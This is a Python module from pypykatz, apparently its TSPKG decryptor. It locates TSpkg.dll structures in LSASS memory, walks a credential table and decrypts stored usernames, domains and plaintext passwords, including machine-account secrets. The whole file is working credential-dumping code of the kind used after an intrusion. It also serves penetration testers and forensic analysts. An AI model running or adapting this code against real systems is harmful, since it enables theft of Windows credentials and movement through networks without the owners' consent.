#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#
import io
import json
from pypykatz import logger

from pypykatz.alsadecryptor.package_commons import PackageDecryptor
from pypykatz.alsadecryptor.win_datatypes import PRTL_AVL_TABLE

class TspkgCredential:
	def __init__(self):
		self.credtype = 'tspkg'
		self.username = None
		self.domainname = None
		self.password = None
		self.password_raw = None
		self.luid = None
	
	def to_dict(self):
		t = {}
		t['credtype'] = self.credtype
		t['username'] = self.username
		t['domainname'] = self.domainname
		t['password'] = self.password
		t['password_raw'] = self.password_raw
		t['luid'] = self.luid
		return t

	def to_json(self):
		return json.dumps(self.to_dict())
		
	def __str__(self):
		t = '\t== TSPKG [%x]==\n' % self.luid
		t += '\t\tusername %s\n' % self.username
		t += '\t\tdomainname %s\n' % self.domainname
		t += '\t\tpassword %s\n' % self.password
		t += '\t\tpassword (hex)%s\n' % self.password_raw.hex()
		return t
		
class TspkgDecryptor(PackageDecryptor):
	def __init__(self, reader, decryptor_template, lsa_decryptor, sysinfo):
		super().__init__('Tspkg', lsa_decryptor, sysinfo, reader)
		self.decryptor_template = decryptor_template
		self.credentials = []
		

	async def find_first_entry(self):
		position = await self.find_signature('TSpkg.dll',self.decryptor_template.signature)
		ptr_entry_loc = await self.reader.get_ptr_with_offset(position + self.decryptor_template.avl_offset)
		ptr_entry = await self.reader.get_ptr(ptr_entry_loc)
		return ptr_entry, ptr_entry_loc
	
	async def start(self):
		try:
			entry_ptr_value, entry_ptr_loc = await self.find_first_entry()
		except Exception as e:
			self.log('Failed to find structs! Reason: %s' % e)
			return
		result_ptr_list = []
		await self.reader.move(entry_ptr_value)
		try:
			ptable = await PRTL_AVL_TABLE.load(self.reader)
			start_node = await ptable.read(self.reader)
		except Exception as e:
			logger.error('Failed to prcess TSPKG package! Reason: %s' % e)
			return
		await self.walk_avl(start_node.BalancedRoot.RightChild, result_ptr_list)
		for ptr in result_ptr_list:
			await self.log_ptr(ptr, self.decryptor_template.credential_struct.__name__)
			await self.reader.move(ptr)
			credential_struct = await self.decryptor_template.credential_struct.load(self.reader)
			primary_credential = await credential_struct.pTsPrimary.read(self.reader)
			if not primary_credential is None:
				c = TspkgCredential()
				c.luid = credential_struct.LocallyUniqueIdentifier
				#c.username = primary_credential.credentials.UserName.read_string(self.reader)
				#c.domainname = primary_credential.credentials.Domaine.read_string(self.reader)
				#### the above two lines will be switched, because it seems that username and domainname is always switched in this package.
				#### reason is beyond me...

				c.domainname = await primary_credential.credentials.UserName.read_string(self.reader)
				c.username = await primary_credential.credentials.Domaine.read_string(self.reader)
				
				if primary_credential.credentials.Password.Length != 0:
					enc_data = await primary_credential.credentials.Password.read_maxdata(self.reader)
					if c.username.endswith('$') is True:
						c.password, c.password_raw = self.decrypt_password(enc_data, bytes_expected=True)
						if c.password is not None:
							c.password = c.password.hex()
					else:
						c.password, c.password_raw = self.decrypt_password(enc_data)					
				
				self.credentials.append(c)